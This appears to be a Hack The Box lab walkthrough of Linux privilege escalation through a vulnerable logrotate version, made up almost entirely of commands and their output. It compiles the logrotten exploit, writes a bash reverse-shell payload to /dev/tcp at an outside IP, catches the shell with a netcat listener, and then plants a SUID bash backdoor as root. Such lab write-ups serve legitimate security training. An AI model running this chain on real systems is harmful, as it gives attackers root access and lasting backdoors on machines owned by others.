# Logrotate

## Monitoring

```shell
htb-student@ubuntu:~$ ./pspy64 --interval 1000 --procevents
```

```output title="Output" hl_lines="2"
2025/05/17 20:48:26 CMD: UID=0     PID=13206  | /bin/sh /root/log.sh
2025/05/17 20:48:26 CMD: UID=0     PID=13207  | /usr/sbin/logrotate -f /root/log.cfg
2025/05/17 20:48:26 CMD: UID=0     PID=13208  | sleep 5
2025/05/17 20:48:31 CMD: UID=0     PID=13211  | /bin/sh /root/log.sh
2025/05/17 20:48:31 CMD: UID=0     PID=13212  | /usr/sbin/logrotate -f /root/log.cfg
2025/05/17 20:48:31 CMD: UID=0     PID=13213  | sleep 5
2025/05/17 20:48:36 CMD: UID=0     PID=13216  | /bin/sh /root/log.sh
2025/05/17 20:48:36 CMD: UID=0     PID=13217  | /usr/sbin/logrotate -f /root/log.cfg
2025/05/17 20:48:36 CMD: UID=0     PID=13218  | sleep 5
2025/05/17 20:48:41 CMD: UID=0     PID=13221  | /bin/sh /root/log.sh
2025/05/17 20:48:41 CMD: UID=0     PID=13222  | /usr/sbin/logrotate -f /root/log.cfg
2025/05/17 20:48:41 CMD: UID=0     PID=13223  | sleep 5
```

## Checking Version

| VULNERABLE LOGROTATE |
|---|
| 3.8.6 |
| 3.11.0 |
| 3.15.0 |
| 3.18.0 |

```shell
htb-student@ubuntu:~$ logrotate --version
```

```output title="Output"
logrotate 3.11.0
```

## Checking Status File

```shell
htb-student@ubuntu:~$ cat /var/lib/logrotate.status
```

```output title="Output"
logrotate state -- version 2
"/home/htb-student/backups/access.log" 2023-6-14-14:1:27
```

## Checking Write Permission

```shell
htb-student@ubuntu:~$ ls -l /home/htb-student/backups
```

```output title="Output" hl_lines="2"
total 4
-rw-r--r-- 1 htb-student htb-student  0 May 17 21:26 access.log
-rw-r--r-- 1 htb-student htb-student 91 May 17 21:26 access.log.1
```

## Checking Configuration Option

```shell
htb-student@ubuntu:~$ grep 'create\|compress' /etc/logrotate.conf
```

```output title="Output"
create
```

## [LOGrotten](https://github.com/whotwagner/logrotten)

```shell
htb-student@ubuntu:~$ gcc -o logrotten logrotten/logrotten.c
```

## Creating the Payload

```shell
htb-student@ubuntu:~$ echo '/bin/bash -i >& /dev/tcp/10.10.14.235/9001 0>&1' > payload
```

## Netcat

```shell
my@attack:~$ nc -lvnp 9001
```

## Triggering

=== "CREATE"

    ```shell
    htb-student@ubuntu:~$ echo x > /home/htb-student/backups/access.log; ./logrotten -p payload /home/htb-student/backups/access.log
    ```

=== "COMPRESS"

    ```shell
    htb-student@ubuntu:~$ echo x > /home/htb-student/backups/access.log; ./logrotten -p payload -c -s 4 /home/htb-student/backups/access.log
    ```

```output title="Output"
Waiting for rotating /home/htb-student/backups/access.log...
Renamed /home/htb-student/backups with /home/htb-student/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!
```

## Session Established

```shell
root@ubuntu:~# whoami
```

```output title="Output"
root
```

## SUID

```shell
root@ubuntu:~# chmod 4777 "$(which bash)"
root@ubuntu:~# ls -l "$(which bash)"
```

```output title="Output"
-rwsrwxrwx 1 root root 1183448 Apr 18  2022 /usr/bin/bash
```

## Privilege Escalation After

```shell
htb-student@ubuntu:~$ bash -p
```
